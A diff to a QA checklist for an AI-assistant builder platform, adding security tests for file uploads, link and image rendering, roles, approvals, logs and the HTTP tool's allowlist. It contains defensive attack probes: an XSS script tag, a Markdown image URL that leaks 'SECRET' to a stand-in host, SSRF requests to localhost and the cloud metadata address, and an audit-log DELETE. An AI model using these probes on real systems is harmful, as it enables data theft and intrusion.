@@ -642,8 +642,10 @@ The local test MCP server is the repo's own echo server,
 - [ ] **10.1.3 Outside the allowlist:** `http: GET https://example.com/`.
   **Expect:** error `blocked: example.com is not in this assistant's
   allowed domains`. Nothing was sent.
-- [ ] **10.1.4 Inside the network.** Clear **Allowed domains** (any public
-  site allowed), then try each of these:
+- [ ] **10.1.4 Inside the network.** Set **Allowed domains** to
+  `127.0.0.1, 169.254.169.254, localhost` (listing them on purpose: being
+  on the list never makes an internal address reachable), then try each
+  of these:
   - `http: GET http://127.0.0.1:8000/healthz` → `blocked: 127.0.0.1 is not a public address`
   - `http: GET http://169.254.169.254/latest/meta-data/` → the same (the cloud metadata address)
   - `http: GET http://localhost:6379/` → `blocked: localhost resolves to a private or reserved address`
@@ -1719,6 +1721,231 @@ Signed out, open `http://localhost:3000/`.
 - [ ] **14.9 The links.** **Create an account** and **Sign in** (top,
   hero and bottom), on a computer. **Expect:** the sign-up and sign-in
   pages.
+
+## 15. Phase 7a: security and platform fixes
+
+### 15.1 Uploaded files never run as the app (7a.1)
+
+Use any assistant's **Sources** page, signed in as a builder.
+
+- [ ] **15.1.1 An HTML file is shown as text.** Save a file named
+  `test.html` containing `<script>alert('hello')</script>Hello`. Upload it,
+  wait for it to index, ask a question it answers, and open the citation's
+  source. **Expect:** a page showing the text itself, `<script>` tags and
+  all, and no alert.
+- [ ] **15.1.2 A disguised file is still text.** Rename the same file to
+  `test.pdf` and upload it. **Expect:** it uploads; opening its source
+  shows the text, not a PDF and not an alert.
+- [ ] **15.1.3 A real PDF opens, a Word file downloads.** Upload a PDF and a
+  `.docx`, cite each, open the source. **Expect:** the PDF opens in the
+  browser at the cited page; the Word file downloads with its name.
+- [ ] **15.1.4 Other files are refused.** Try to upload a `.png` or
+  `.exe`. **Expect:** the file picker only offers the supported types;
+  forced through anyway, the upload is refused with "This file can't be
+  added. Use PDF, Word (.docx), HTML, Markdown or plain text."
+- [ ] **15.1.5 On the production stack**, open a cited source and look at
+  the response headers (browser developer tools, Network tab).
+  **Expect:** `X-Content-Type-Options: nosniff` and a
+  `Content-Security-Policy` with `script-src 'none'`. A PDF still opens.
+- [ ] **15.1.6 The tests.** From `apps/api`, with the dev stack up:
+  `python -m pytest tests/test_file_types.py tests/test_data_sources.py -m "integration or not integration" -q`.
+  **Expect:** all pass.
+
+### 15.2 Answers can't send data out through images or links (7a.2)
+
+The dev stack's fake driver echoes what it is sent, so the Markdown below
+comes back as the answer. Use any assistant's chat.
+
+- [ ] **15.2.1 An image is not loaded.** Send
+  `![chart](https://example.com/pixel.png?d=SECRET)`. **Expect:** the
+  answer shows a small box reading "Image not shown: chart (example.com)",
+  no picture. In the Network tab, no request goes to `example.com`.
+- [ ] **15.2.2 A link shows its host.** Send
+  `[Refund policy](https://example.com/refunds)`. **Expect:** "Refund
+  policy" as a link with "(example.com)" after it in grey; hovering the
+  link shows the full address; it opens in a new tab.
+- [ ] **15.2.3 No repeated address.** Send `https://example.com/refunds`
+  on its own. **Expect:** the address as a link, with no "(example.com)"
+  after it.
+- [ ] **15.2.4 Citations unchanged.** Ask a question a knowledge base
+  answers. **Expect:** the numbered source chips look and behave as
+  before, with no host beside them.
+- [ ] **15.2.5 The page refuses outside images.** Open any page, then the
+  response headers of the page itself (Network tab, the document request).
+  **Expect:** the `Content-Security-Policy` includes
+  `img-src 'self' data: blob:`.
+- [ ] **15.2.6 The tests.** From `apps/web`:
+  `npx vitest run lib/safe-links.test.ts components/chat/markdown-safety.test.ts security-headers.test.ts`.
+  **Expect:** 15 pass.
+
+### 15.3 Every route has a rule, and new roles get nothing (7a.3)
+
+There is no role below member yet, so the deny-by-default part is checked
+by the tests; these steps check that today's roles behave as before. You
+need an owner and a second account invited as a **member** (a private
+window keeps both signed in).
+
+- [ ] **15.3.1 Members still build.** As the member, create an assistant,
+  add a text source and send a chat message. **Expect:** all of it works.
+- [ ] **15.3.2 The MCP catalog still loads.** As the member, in their
+  assistant's builder, open **Add MCP server**. **Expect:** the catalog of
+  known servers is listed, and the sandbox status shows.
+- [ ] **15.3.3 Someone else's assistant is read-only.** As the member, open
+  an assistant the owner created and try to save a change. **Expect:**
+  refused with "You can only edit assistants you created (or need an admin
+  role)".
+- [ ] **15.3.4 Admin pages stay admin-only.** As the member, try to change
+  a budget on the **Usage** page or a role on **Members**. **Expect:** the
+  controls are disabled or the change is refused.
+- [ ] **15.3.5 The tests.** From `apps/api`, with the dev stack up:
+  `python -m pytest tests/test_role_matrix.py -q`. **Expect:** 6 pass.
+
+### 15.4 Admins read conversations but cannot act in them (7a.4)
+
+You need a **member** with a conversation (send it a message or two) and
+an **admin** of the same org, in a private window.
+
+- [ ] **15.4.1 The admin can read it.** As the admin, open the assistant's
+  chat and pick the member's conversation. **Expect:** its messages and
+  **Run details** show.
+- [ ] **15.4.2 But not reply in it.** **Expect:** no message box and no
+  Send; in their place, "Only the person who started this conversation can
+  reply in it."
+- [ ] **15.4.3 Or rename or archive it.** Hover the member's conversation in
+  the list. **Expect:** no Rename or Archive buttons on it.
+- [ ] **15.4.4 The admin's own conversations work.** Click **New chat**.
+  **Expect:** the message box, Send, Rename and Archive are all there.
+- [ ] **15.4.5 The member is unaffected.** As the member, open the same
+  conversation. **Expect:** they can reply, rename and archive as before.
+- [ ] **15.4.6 Approvals still reach admins.** If the member's assistant
+  has a database write that asks for approval, trigger one as the member
+  and open the conversation as the admin. **Expect:** the approval card
+  shows and the admin can approve or decline it.
+- [ ] **15.4.7 The tests.** From `apps/api`:
+  `python -m pytest tests/test_rbac_escalation.py tests/test_role_matrix.py -q`;
+  from `apps/web`:
+  `npx vitest run components/chat/conversation-access.test.ts components/chat/conversation-list-access.test.ts`.
+  **Expect:** all pass.
+
+### 15.5 The CLI's transcripts survive a redeploy and leave with their conversation (7a.5)
+
+Steps 15.5.1–15.5.3 need the **real model** (they cost a little) on the
+production stack; 15.5.4 does not.
+
+- [ ] **15.5.1 A conversation carries on after a redeploy.** Have a
+  two-message conversation, then rebuild and restart the stack
+  (`COMPOSE up -d --build`). Send a third message that refers to the first
+  ("what did I ask first?"). **Expect:** a normal answer that knows the
+  earlier messages, not an error.
+- [ ] **15.5.2 Even if the volume is lost.** Stop the stack, remove the
+  volume (`docker volume rm assistant-studio-prod_agentstate`), start it,
+  and send another message in the same conversation. **Expect:** it still
+  answers with the earlier context, and the API log has
+  `session_missing_replayed` for that conversation.
+- [ ] **15.5.3 Archiving removes the transcript.** Note the conversation's
+  id (in the address bar), list
+  `COMPOSE exec api ls /var/lib/assistant-studio/claude/projects`, archive
+  the conversation, and list again. **Expect:** the folder ending in that
+  id is gone.
+- [ ] **15.5.4 The tests.** From `apps/api`:
+  `python -m pytest tests/test_cli_files.py tests/test_deploy.py -q`.
+  **Expect:** all pass.
+
+### 15.6 The file store, pinned versions and model aliases (7a.6)
+
+- [ ] **15.6.1 Old files survive the new file store.** On a stack that ran
+  before this release, rebuild and start it. **Expect:** `COMPOSE ps -a`
+  shows `minio-owner` exited (0) and `minio` healthy; a citation link to a
+  file uploaded before still opens.
+- [ ] **15.6.2 A backup still works.** Run `deploy/backup/backup.sh` then
+  `deploy/backup/verify.sh`. **Expect:** `verified`, and the files in
+  `backups/<time>/objects` belong to you, not to user 65532.
+- [ ] **15.6.3 New assistants follow the families.** Create an assistant
+  and open **Panels**. **Expect:** the model is "Sonnet (latest)"; the
+  list offers Haiku, Sonnet, Opus and Fable (latest) first, then the pinned
+  versions, including Sonnet 5.5, Opus 5.5 and Fable 5.1.
+- [ ] **15.6.4 What ran is what's shown** (real model, costs a little).
+  Chat once with a "Sonnet (latest)" assistant and open **Run details**.
+  **Expect:** the model is Sonnet 5.5, and the cost matches its price ($2
+  in, $10 out per million tokens), not $5 / $25.
+- [ ] **15.6.5 Opus 5.5 really answers** (real model). Set the main model
+  to "Opus (latest)" and thinking to off, and chat. **Expect:** an answer,
+  no error, and **Run details** names Opus 5.5 with no fallback model.
+- [ ] **15.6.6 A typo in MODEL_ALIASES stops the start.** Set
+  `MODEL_ALIASES={"sonet":"claude-sonnet-5-5"}` in `.env.production` and
+  restart the API. **Expect:** the preflight prints a `FAIL` for
+  `MODEL_ALIASES` and the API does not start. Remove it again.
+- [ ] **15.6.7 The tests.** From `apps/api`:
+  `python -m pytest tests/test_model_aliases.py tests/test_deploy.py tests/test_agent_resilience.py -q`.
+  **Expect:** all pass.
+
+### 15.7 Approvals that tell the truth, and recovery after a crash (7a.7)
+
+Use an assistant with a database connection whose writes ask for approval
+(Panels > Databases), on the dev stack.
+
+- [ ] **15.7.1 A last-second click is never a false "approved".** Set
+  `APPROVAL_TIMEOUT_S=20` (restart the API), ask for a write, and click
+  **Approve** in the last second of the card's countdown. Repeat a few
+  times. **Expect:** each time, either the write happened and **Run
+  details** says "Approved by …", or nothing was written and it says "No
+  answer: declined" (the card closes). Never "Approved" without the write.
+- [ ] **15.7.2 A decision is audited.** Ask for another write and approve
+  it in time. **Expect:** the write happens, and **Members > Audit log**
+  has an `approval.approved` entry naming you.
+- [ ] **15.7.3 A crash leaves nothing pending.** Ask for a write, and while
+  the card waits, kill the API process (stop it from the terminal, not
+  with Stop). Start it again and wait two minutes. **Expect:** the card is
+  gone after a reload; the conversation shows "This message wasn't
+  answered: the server stopped while it was being answered. Send it
+  again."; the audit log has an `approval.expired` entry with reason
+  `orphaned`.
+- [ ] **15.7.4 The tests.** From `apps/api`, with the dev stack up:
+  `python -m pytest tests/test_approval_races.py -q`. **Expect:** 15 pass.
+
+### 15.8 Phones stay signed in, and logs are kept (7a.8)
+
+- [ ] **15.8.1 A server you can't reach is not a sign-out.** Sign in, then
+  stop the API and reload the page. **Expect:** "Can't reach the server
+  right now. You're still signed in, and this page tries again by itself."
+  (not the sign-in page). Start the API again. **Expect:** within about
+  30 seconds, or at once on **Try now**, the workspace is back, still
+  signed in.
+- [ ] **15.8.2 On a phone.** Open the app on a phone, switch to airplane
+  mode for a minute, then back. **Expect:** no sign-in page; at most a
+  short "Can't reach the server" banner that goes away.
+- [ ] **15.8.3 Signing out still works.** Click **Sign out**, then press
+  Back. **Expect:** the sign-in page, not the workspace.
+- [ ] **15.8.4 The proxy log** (production stack). Open a few pages and one
+  citation link, then
+  `COMPOSE exec proxy tail -n 5 /var/log/caddy/access.log`. **Expect:** JSON
+  lines with your address and the paths; no `X-Amz-Signature`, no invite
+  token, and `Authorization` shown as `REDACTED`.
+- [ ] **15.8.5 The audit log can't be edited.** In
+  `COMPOSE exec postgres psql -U app app`, run
+  `DELETE FROM audit_log WHERE id = (SELECT id FROM audit_log LIMIT 1);`.
+  **Expect:** `ERROR: audit_log is append-only: rows cannot be deleted`.
+- [ ] **15.8.6 The tests.** From `apps/api`, with the dev stack up:
+  `python -m pytest tests/test_session_resilience.py -q -m "integration or not integration"`;
+  from `apps/web`: `npx vitest run lib/session.test.ts`. **Expect:** all
+  pass.
+
+### 15.9 The HTTP tool reaches only its allowed sites (7a.9)
+
+- [ ] **15.9.1 No list, no sites.** In an assistant's Panels › Tools,
+  switch on **HTTP requests** and leave **Allowed domains** empty.
+  **Expect:** the warnings panel says "The HTTP request tool has no
+  allowed sites, so every request it makes will be refused", and the hint
+  under the field says the same. In chat, `http: GET https://example.com/`.
+  **Expect:** a failed `http_request` card: "blocked: this assistant isn't
+  allowed to reach any sites yet…", and nothing was fetched.
+- [ ] **15.9.2 A listed site works.** Set **Allowed domains** to
+  `example.com` and try the same message. **Expect:** `HTTP 200 OK`.
+- [ ] **15.9.3 Open sites are named.** Add `pastebin.com` to the list.
+  **Expect:** a warning that anyone can publish on pastebin.com.
+- [ ] **15.9.4 The tests.** From `apps/api`:
+  `python -m pytest tests/test_http_tool.py tests/test_graph_validate.py -q`.
+  **Expect:** all pass.
 
 ## Reporting a failure
 
